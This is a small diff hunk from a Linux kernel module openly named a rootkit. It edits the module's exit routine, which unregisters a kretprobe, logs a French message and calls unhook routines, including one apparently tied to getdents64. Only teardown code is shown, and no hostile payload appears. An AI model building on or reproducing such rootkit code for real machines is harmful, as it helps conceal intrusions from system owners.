@@ -44,9 +44,6 @@ static void __exit rootkit_exit(void) {
 
   unregister_kretprobe(&sig_kp);
   printk(KERN_INFO "kprobe %p retiré\n", sig_kp.kp.addr);
-}
-
-
 
   rootkit_exit_hook();
   rootkit_exit_hook_getdents64();
